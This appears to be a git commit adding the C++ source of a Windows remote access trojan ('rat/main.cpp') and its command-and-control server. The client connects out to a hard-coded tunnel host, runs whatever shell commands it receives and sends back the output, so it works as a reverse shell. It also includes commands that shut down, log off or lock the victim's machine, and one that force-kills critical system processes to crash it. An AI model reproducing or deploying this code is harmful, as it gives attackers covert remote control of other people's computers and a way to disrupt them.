c77f0bdfd90cc19a19b0ac8ccd6070f10529a09e
dankor33 <84600022+dankor33@users.noreply.github.com>
2025-02-08 18:42:47 +0000

    v1

---
+++ rat/main.cpp
@@ -0,0 +1,132 @@
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#include <string>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+#define DEFAULT_BUFLEN 1024
+
+void execute_command(const std::string& command, std::string& output) {
+    char buffer[DEFAULT_BUFLEN];
+    FILE* pipe = _popen(command.c_str(), "r");
+    if (!pipe) {
+        output = "Failed to execute command.\n";
+        return;
+    }
+    while (fgets(buffer, DEFAULT_BUFLEN, pipe) != nullptr) {
+        output += buffer;
+    }
+    _pclose(pipe);
+}
+
+int main() {
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    struct addrinfo* result = nullptr, * ptr = nullptr, hints;
+    const char* server_ip = "ie-glasgow.gl.at.ply.gg";
+    const char* server_port = "55375";
+
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    getaddrinfo(server_ip, server_port, &hints, &result);
+
+    for (ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
+        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+        if (ConnectSocket == INVALID_SOCKET) {
+            WSACleanup();
+            return 1;
+        }
+
+        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+            continue;
+        }
+        break;
+    }
+
+    freeaddrinfo(result);
+
+    if (ConnectSocket == INVALID_SOCKET) {
+        WSACleanup();
+        return 1;
+    }
+
+    char recvbuf[DEFAULT_BUFLEN];
+    int recvbuflen = DEFAULT_BUFLEN;
+    std::string command, output;
+
+    while (true) {
+        int iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+        if (iResult > 0) {
+            command.assign(recvbuf, iResult);
+            if (command == "exit") {
+                break;
+            }
+            if (command == "shutdown")
+            {
+                system("shutdown /s /t 0");
+            }
+			else if (command == "logoff")
+			{
+				system("shutdown /l");
+			}
+			else if (command == "hibernate")
+			{
+				system("shutdown /h");
+			}
+            else if (command == "restart")
+            {
+                system("shutdown /r /t 0");
+            }
+            else if (command == "bsod")
+            {
+                system("taskkill /f /im explorer.exe");
+                system("taskkill /f /im svchost.exe");
+                system("taskkill /f /im wininit.exe");
+                system("taskkill /f /im winlogon.exe");
+                system("taskkill /f /im lsass.exe");
+                system("taskkill /f /im csrss.exe");
+                system("taskkill /f /im smss.exe");
+                system("taskkill /f /im services.exe");
+                system("taskkill /f /im spoolsv.exe");
+                system("taskkill /f /im lsm.exe");
+                system("taskkill /f /im winlogon");
+            }
+			else if (command == "lock")
+			{
+				system("rundll32.exe user32.dll,LockWorkStation");
+			}
+            else if (command == "hide")
+            {
+				HWND hWnd = GetConsoleWindow();
+				ShowWindow(hWnd, SW_HIDE);
+			}
+            else if (command == "show")
+            {
+                HWND hWnd = GetConsoleWindow();
+                ShowWindow(hWnd, SW_SHOW);
+            }
+            output.clear();
+            execute_command(command, output);
+            send(ConnectSocket, output.c_str(), output.length(), 0);
+        }
+        else if (iResult == 0) {
+            break;
+        }
+        else {
+            break;
+        }
+    }
+
+    closesocket(ConnectSocket);
+    WSACleanup();
+    return 0;
+}
---
+++ server/main.cpp
@@ -0,0 +1,137 @@
+#include <iostream>
+#include <string>
+#include <vector>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <thread>
+#include <map>
+#include <chrono>
+#include <mutex>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+#define DEFAULT_BUFLEN 1024
+
+std::map<SOCKET, std::string> clientSockets;
+std::mutex clientSocketsMutex;
+
+void list_clients() {
+    std::lock_guard<std::mutex> lock(clientSocketsMutex);
+    std::cout << "Connected clients:" << std::endl;
+    int index = 1;
+    for (const auto& client : clientSockets) {
+        std::cout << index++ << ": " << client.second << std::endl;
+    }
+}
+
+void remove_disconnected_clients() {
+    while (true) {
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        std::lock_guard<std::mutex> lock(clientSocketsMutex);
+        for (auto it = clientSockets.begin(); it != clientSockets.end(); ) {
+            char buffer;
+            int result = recv(it->first, &buffer, 1, MSG_PEEK);
+            if (result == 0 || (result == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)) {
+                std::cout << "Client disconnected: " << it->second << std::endl;
+                closesocket(it->first);
+                it = clientSockets.erase(it);
+            }
+            else {
+                ++it;
+            }
+        }
+    }
+}
+
+void handle_client(SOCKET ClientSocket) {
+    char recvbuf[DEFAULT_BUFLEN];
+    int recvbuflen = DEFAULT_BUFLEN;
+    std::string command;
+
+    while (true) {
+        std::cout << "Enter command: ";
+        std::getline(std::cin, command);
+        if (command == "exit") {
+            send(ClientSocket, command.c_str(), command.length(), 0);
+            break;
+        }
+        else if (command == "list") {
+            list_clients();
+            continue;
+        }
+        else if (command.rfind("switch ", 0) == 0) {
+            int clientIndex = std::stoi(command.substr(7)) - 1;
+            if (clientIndex >= 0 && clientIndex < clientSockets.size()) {
+                auto it = std::next(clientSockets.begin(), clientIndex);
+                ClientSocket = it->first;
+                std::cout << "Switched to client " << clientIndex + 1 << ": " << it->second << std::endl;
+            }
+            else {
+                std::cout << "Invalid client index" << std::endl;
+            }
+            continue;
+        }
+
+        send(ClientSocket, command.c_str(), command.length(), 0);
+
+        int iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+        if (iResult > 0) {
+            std::string output(recvbuf, iResult);
+            std::cout << output << std::endl;
+        }
+    }
+}
+
+void add_client(SOCKET ClientSocket, sockaddr_in clientAddr) {
+    char clientIP[INET_ADDRSTRLEN];
+    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
+    std::string clientInfo = std::string(clientIP) + ":" + std::to_string(ntohs(clientAddr.sin_port));
+    {
+        std::lock_guard<std::mutex> lock(clientSocketsMutex);
+        clientSockets[ClientSocket] = clientInfo;
+    }
+    std::cout << "Client connected: " << clientInfo << std::endl;
+}
+
+int main() {
+    WSADATA wsaData;
+    SOCKET ListenSocket = INVALID_SOCKET;
+    struct addrinfo* result = nullptr, hints;
+    const char* server_port = "55375";
+
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_flags = AI_PASSIVE;
+
+    getaddrinfo(nullptr, server_port, &hints, &result);
+
+    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+    bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
+    freeaddrinfo(result);
+    listen(ListenSocket, SOMAXCONN);
+
+    std::thread clientHandler;
+    std::thread disconnectionChecker(remove_disconnected_clients);
+    disconnectionChecker.detach();
+
+    while (true) {
+        sockaddr_in clientAddr;
+        int clientAddrSize = sizeof(clientAddr);
+        SOCKET ClientSocket = accept(ListenSocket, (sockaddr*)&clientAddr, &clientAddrSize);
+        if (ClientSocket != INVALID_SOCKET) {
+            add_client(ClientSocket, clientAddr);
+            if (!clientHandler.joinable()) {
+                clientHandler = std::thread(handle_client, ClientSocket);
+                clientHandler.detach();
+            }
+        }
+    }
+
+    closesocket(ListenSocket);
+    WSACleanup();
+    return 0;
+}
